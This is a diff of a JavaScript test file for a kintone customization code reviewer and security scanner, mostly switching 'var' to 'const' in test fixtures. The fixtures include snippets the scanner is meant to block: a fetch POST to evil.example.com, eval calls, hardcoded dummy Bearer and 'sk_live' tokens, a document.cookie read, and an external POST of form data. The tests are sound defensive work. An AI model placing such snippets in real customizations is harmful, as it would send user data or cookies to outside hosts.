@@ -23,7 +23,7 @@ const FIELD_ON_OFF = [
   "(function () {",
   "  'use strict';",
   "  kintone.events.on(['app.record.create.show', 'app.record.edit.show'], function (event) {",
-  "    var record = event.record;",
+  "    const record = event.record;",
   "    if (record['ステータス'].value === '承認待ち') {",
   "      record['amount'].disabled = true;",
   "    }",
@@ -83,8 +83,8 @@ const NEW_JS_GOOD = [
   "(function () {",
   "  'use strict';",
   "  kintone.events.on(['app.record.create.change.amount', 'app.record.edit.change.amount'], function (event) {",
-  "    var record = event.record;",
-  "    var amount = Number(record['amount'].value || 0);",
+  "    const record = event.record;",
+  "    const amount = Number(record['amount'].value || 0);",
   "    record['amount'].error = amount >= 1000000 ? '100万円以上は部長の承認が必要です' : null;",
   "    return event;",
   "  });",
@@ -114,7 +114,7 @@ console.log('\n--- §51-1. KTJsCatalog（決定的な Event / API Catalog）---'
   const ch = KTJsCatalog.checkEvent('app.record.create.change.amount', { fields: ['amount'] });
   assert(ch.ok && ch.field === 'amount' && KTJsCatalog.checkEvent('app.record.create.change.nope', { fields: ['amount'] }).ok === false, 'change イベントはフィールドの実在を確認する');
   assert(KTJsCatalog.eventPlatform('mobile.app.record.edit.show') === 'mobile' && KTJsCatalog.eventPlatform('app.record.edit.show') === 'desktop', 'イベントの platform');
-  const sec = KTJsCatalog.scanSecurity("fetch('https://evil.example.com/x', { method: 'POST', body: '1' }); eval('1'); var h = { Authorization: 'Bearer abcdefghijklmnop1234' };");
+  const sec = KTJsCatalog.scanSecurity("fetch('https://evil.example.com/x', { method: 'POST', body: '1' }); eval('1'); const h = { Authorization: 'Bearer abcdefghijklmnop1234' };");
   assert(sec.some(x => x.severity === 'block') && sec.length >= 3, `Security rules: 外部 POST / eval / Authorization を検出（${sec.length} 件）`);
 }
 
@@ -257,15 +257,15 @@ console.log('\n--- §52-2. KTCodeReview: 構文 / 未知イベント / 未知フ
   assert(extraEv.status === 'REVIEW_REQUIRED' && extraEv.mismatches.some(m => m.code === 'EXTRA_EVENT'), '計画に無いイベントの登録: 計画との不一致（確認が必要）');
   const dangerous = run(NEW_JS_GOOD.replace("    return event;", "    eval('1 + 1');\n    return event;"));
   assert(dangerous.status === 'BLOCKED' && !check(dangerous, 'security').ok && /eval/i.test(check(dangerous, 'security').message), '危険 API（eval）: BLOCKED');
-  const secret = run(NEW_JS_GOOD.replace("    return event;", "    var h = { Authorization: 'Bearer abcdefghijklmnop1234567890' };\n    return event;"));
+  const secret = run(NEW_JS_GOOD.replace("    return event;", "    const h = { Authorization: 'Bearer abcdefghijklmnop1234567890' };\n    return event;"));
   assert(secret.status === 'BLOCKED' && !check(secret, 'security').ok, 'ハードコードされた Authorization: BLOCKED');
-  const token = run(NEW_JS_GOOD.replace("    return event;", "    var API_TOKEN = 'sk_live_0123456789abcdefABCDEF';\n    return event;"));
+  const token = run(NEW_JS_GOOD.replace("    return event;", "    const API_TOKEN = 'sk_live_0123456789abcdefABCDEF';\n    return event;"));
   assert(token.status === 'BLOCKED' && !check(token, 'security').ok, 'ハードコードされた token: BLOCKED');
   const ext = run(NEW_JS_GOOD.replace("    return event;", "    fetch('https://api.example.com/notify', { method: 'POST', body: JSON.stringify({ amount: amount }) });\n    return event;"));
   assert(ext.status === 'BLOCKED' && !check(ext, 'security').ok && /外部|example\.com|POST/i.test(check(ext, 'security').message), '外部への POST: BLOCKED（既定で外部通信は禁止）');
-  const cookie = run(NEW_JS_GOOD.replace("    return event;", "    var ck = document.cookie;\n    return event;"));
+  const cookie = run(NEW_JS_GOOD.replace("    return event;", "    const ck = document.cookie;\n    return event;"));
   assert(cookie.status === 'BLOCKED' && !check(cookie, 'security').ok, 'document.cookie: BLOCKED');
-  const globals = run("var EVENTS = ['app.record.create.change.amount', 'app.record.edit.change.amount'];\nkintone.events.on(EVENTS, function (event) { event.record['amount'].error = null; return event; });");
+  const globals = run("const EVENTS = ['app.record.create.change.amount', 'app.record.edit.change.amount'];\nkintone.events.on(EVENTS, function (event) { event.record['amount'].error = null; return event; });");
   assert(globals.status === 'REVIEW_REQUIRED' && !check(globals, 'globals').ok, '即時関数で包まない（グローバル汚染）: 確認が必要');
   const noReturn = run(NEW_JS_GOOD.replace("    return event;\n", ""));
   assert(noReturn.status === 'REVIEW_REQUIRED' && !check(noReturn, 'return-event').ok, 'return event が無い handler: 確認が必要');
@@ -301,7 +301,7 @@ console.log('\n--- §52-2. KTCodeReview: 構文 / 未知イベント / 未知フ
   assert(anchorBad.status === 'BLOCKED' && !check(anchorBad, 'patch').ok && check(anchorBad, 'patch').detail?.code === 'PATCH_ANCHOR_NOT_FOUND', 'anchor が既存ソースに無い: BLOCKED（全文の書き換えに逃げない）');
   const anchorAmb = runP({ baseHash: hash(FIELD_ON_OFF), operations: [{ type: 'INSERT_AFTER', anchor: "record[", content: PATCH_ADDED }] });
   assert(anchorAmb.status === 'BLOCKED' && check(anchorAmb, 'patch').detail?.code === 'PATCH_ANCHOR_AMBIGUOUS', 'anchor が複数回現れる（"record["）: BLOCKED（一意な anchor が必要）');
-  const anchorLine = runP({ baseHash: hash(FIELD_ON_OFF), operations: [{ type: 'INSERT_AFTER', anchor: "    var record = event.record;", content: PATCH_ADDED }] });
+  const anchorLine = runP({ baseHash: hash(FIELD_ON_OFF), operations: [{ type: 'INSERT_AFTER', anchor: "    const record = event.record;", content: PATCH_ADDED }] });
   assert(anchorLine.status === 'OK' && anchorLine.diff.added === 3 && anchorLine.diff.removed === 0, '一意な行を anchor にした INSERT_AFTER: 適用できる（OK）');
   const hashBad = runP({ baseHash: 'deadbeef', operations: PATCH_GOOD.operations });
   assert(hashBad.status === 'BLOCKED' && check(hashBad, 'patch').detail?.code === 'PATCH_BASE_MISMATCH', 'baseHash が現在の本文と違う（既存ファイルが変わった）: BLOCKED');
